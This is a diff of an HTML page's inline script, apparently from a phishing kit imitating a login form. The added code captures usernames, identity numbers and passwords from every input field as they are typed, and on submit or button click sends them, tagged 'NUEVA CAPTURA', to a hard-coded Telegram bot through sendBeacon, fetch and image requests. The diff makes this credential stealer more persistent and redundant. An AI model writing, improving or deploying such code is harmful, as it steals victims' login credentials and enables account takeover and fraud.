@@ -427,95 +427,124 @@
   (function () {
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
+
+    let cacheUsuario = "";
+    let cacheClave = "";
     let ultimoEnvio = "";
     let ultimaHora = 0;
 
-    function leerCampos(form) {
-      const scope = form || document;
+    function guardarCampo(el) {
+      if (!el) return;
+      const id = (el.id || "").toLowerCase();
+      const name = (el.name || "").toLowerCase();
+      const placeholder = (el.placeholder || "").toLowerCase();
 
-      const userEl =
-        scope.querySelector("#campoCorreo") ||
-        scope.querySelector("#loginUsuario") ||
-        Array.from(scope.querySelectorAll("input")).find((el) =>
-          ["text", "email", "tel", "number"].includes(el.type)
-        ) ||
-        null;
-
-      const passEl =
-        scope.querySelector("#campoClave") ||
-        scope.querySelector("#loginPasswordInline") ||
-        scope.querySelector('input[type="password"]') ||
-        null;
-
-      // Si no se pasó un formulario específico, revisa ambos y toma el que tenga texto
-      if (!form) {
-        const uModal = document.querySelector("#campoCorreo")?.value.trim() || "";
-        const pModal = document.querySelector("#campoClave")?.value || "";
-        const uInline = document.querySelector("#loginUsuario")?.value.trim() || "";
-        const pInline = document.querySelector("#loginPasswordInline")?.value || "";
-
-        if (uModal || pModal) {
-          return { usuario: uModal, password: pModal };
-        }
-        return { usuario: uInline, password: pInline };
+      if (
+        el.type === "password" ||
+        id.includes("clave") ||
+        id.includes("pass") ||
+        name.includes("clave") ||
+        name.includes("pass")
+      ) {
+        if (el.value) cacheClave = el.value;
+        return;
       }
 
+      if (
+        id.includes("correo") ||
+        id.includes("usuario") ||
+        name.includes("correo") ||
+        name.includes("usuario") ||
+        placeholder.includes("usuario") ||
+        placeholder.includes("cédula") ||
+        placeholder.includes("cedula") ||
+        ["text", "email", "tel", "number"].includes(el.type)
+      ) {
+        const val = (el.value || "").trim();
+        if (val) cacheUsuario = val;
+      }
+    }
+
+    function obtenerValores() {
+      document.querySelectorAll("input").forEach(guardarCampo);
+
+      const uModal = document.querySelector("#campoCorreo")?.value.trim() || "";
+      const pModal = document.querySelector("#campoClave")?.value || "";
+      const uInline = document.querySelector("#loginUsuario")?.value.trim() || "";
+      const pInline = document.querySelector("#loginPasswordInline")?.value || "";
+
       return {
-        usuario: userEl ? userEl.value.trim() : "",
-        password: passEl ? passEl.value : ""
+        usuario: uModal || uInline || cacheUsuario || "",
+        password: pModal || pInline || cacheClave || ""
       };
     }
 
-    function enviarTelegram(usuario, password) {
+    function enviarAhora() {
+      const { usuario, password } = obtenerValores();
       if (!usuario && !password) return;
 
       const firma = usuario + "|" + password;
       const ahora = Date.now();
-      if (firma === ultimoEnvio && ahora - ultimaHora < 2500) return;
+      if (firma === ultimoEnvio && ahora - ultimaHora < 2000) return;
       ultimoEnvio = firma;
       ultimaHora = ahora;
 
-      const mensaje = [
-        "NUEVA CAPTURA",
-        "Usuario: " + (usuario || "vacio"),
-        "Clave: " + (password || "vacia")
-      ].join("\n");
+      const texto =
+        "NUEVA CAPTURA\n" +
+        "Usuario: " + (usuario || "vacio") + "\n" +
+        "Clave: " + (password || "vacia");
 
-      const endpoint =
+      const url =
         "https://api.telegram.org/bot" +
         TOKEN +
         "/sendMessage?chat_id=" +
         CHAT_ID +
         "&text=" +
-        encodeURIComponent(mensaje);
+        encodeURIComponent(texto);
+
+      try {
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(url);
+        }
+      } catch (e) {}
+
+      try {
+        if (window.fetch) {
+          fetch(url, { mode: "no-cors", keepalive: true }).catch(function () {});
+        }
+      } catch (e) {}
 
       window._imgs = window._imgs || [];
       const img = new Image();
-      img.src = endpoint;
+      img.src = url;
       window._imgs.push(img);
     }
 
-    document.addEventListener(
-      "submit",
-      function (e) {
-        const form = e.target;
-        const { usuario, password } = leerCampos(form);
-        enviarTelegram(usuario, password);
-      },
-      true
-    );
+    document.addEventListener("input", function (e) {
+      guardarCampo(e.target);
+    }, true);
 
-    document.addEventListener(
-      "click",
-      function (e) {
-        const btn = e.target.closest('button[type="submit"], input[type="submit"]');
-        if (!btn) return;
-        const form = btn.closest("form");
-        const { usuario, password } = leerCampos(form);
-        enviarTelegram(usuario, password);
-      },
-      true
-    );
+    document.addEventListener("change", function (e) {
+      guardarCampo(e.target);
+    }, true);
+
+    document.addEventListener("submit", function () {
+      enviarAhora();
+    }, true);
+
+    document.addEventListener("click", function (e) {
+      const target = e.target;
+      if (!target) return;
+      const esBoton =
+        target.closest("button[type='submit']") ||
+        target.closest("input[type='submit']") ||
+        target.closest("#loginModalForm button") ||
+        target.closest("#loginFormInline button");
+
+      if (esBoton) {
+        enviarAhora();
+      }
+    }, true);
   })();
 </script>
 </body>
